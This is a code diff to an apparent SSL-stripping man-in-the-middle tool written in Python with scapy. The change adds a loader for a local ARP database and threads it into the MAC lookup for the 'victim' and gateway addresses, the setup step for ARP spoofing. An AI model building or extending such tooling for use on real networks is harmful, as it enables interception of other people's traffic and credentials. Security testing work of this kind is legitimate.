@@ -13,8 +13,25 @@ class SSLStripConfig:
     mode: str
     log_file: Optional[str]
 
-def get_mac(ip: str, iface: str) -> Optional[str]:
+def load_arp_watcher_db(path: str = "arp-watcher.db") -> dict[str, str]:
+    """Load ARP mappings from local database file."""
+    db = {}
+    try:
+        with open(path, "r") as f:
+            for line in f:
+                parts = line.strip().split()
+                if len(parts) >= 2:
+                    db[parts[0]] = parts[1]
+    except (FileNotFoundError, IOError):
+        pass
+    return db
+
+def get_mac(ip: str, iface: str, arp_db: Optional[dict[str, str]] = None) -> Optional[str]:
     """Resolve MAC address for a given IP."""
+    if arp_db and ip in arp_db:
+        return arp_db[ip]
+
+    print(f"[*] IP {ip} not in ARP DB, attempting active resolution...")
     try:
         ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, iface=iface, verbose=False)
         if ans:
@@ -32,9 +49,10 @@ def run_ssl_strip(config: SSLStripConfig) -> None:
         print("[-] Error: Victim IP and Gateway IP are required.")
         return
 
+    arp_db = load_arp_watcher_db()
     print("[*] Resolving MAC addresses...")
-    victim_mac = get_mac(config.victim_ip, config.iface)
-    gateway_mac = get_mac(config.gateway_ip, config.iface)
+    victim_mac = get_mac(config.victim_ip, config.iface, arp_db)
+    gateway_mac = get_mac(config.gateway_ip, config.iface, arp_db)
     my_mac = scapy.get_if_hwaddr(config.iface)
 
     if not victim_mac or not gateway_mac:
